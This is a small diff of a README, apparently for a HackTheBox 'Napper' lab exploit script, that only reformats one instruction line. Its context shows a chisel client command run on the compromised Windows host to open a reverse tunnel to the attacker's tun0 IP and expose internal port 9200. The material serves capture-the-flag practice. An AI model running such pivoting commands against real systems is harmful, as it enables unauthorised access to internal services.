@@ -15,7 +15,7 @@ user@kali:~$
 C:\Users\ruben\Desktop> chisel.exe client <YOUR_IP>:9000 R:9200:127.0.0.1:9200
 C:\Users\ruben\Desktop> 
 ```
-**Change `<YOUR_IP>` with your `tun0` IP address.**<br>
+> **Change `<YOUR_IP>` with your `tun0` IP address.**<br>
 > *You can also use an available port different than 9000 if you want.<br>
 > `chisel.exe` is **NOT** installed by default on Napper. It is your job to get it on Napper before using this script.*
 
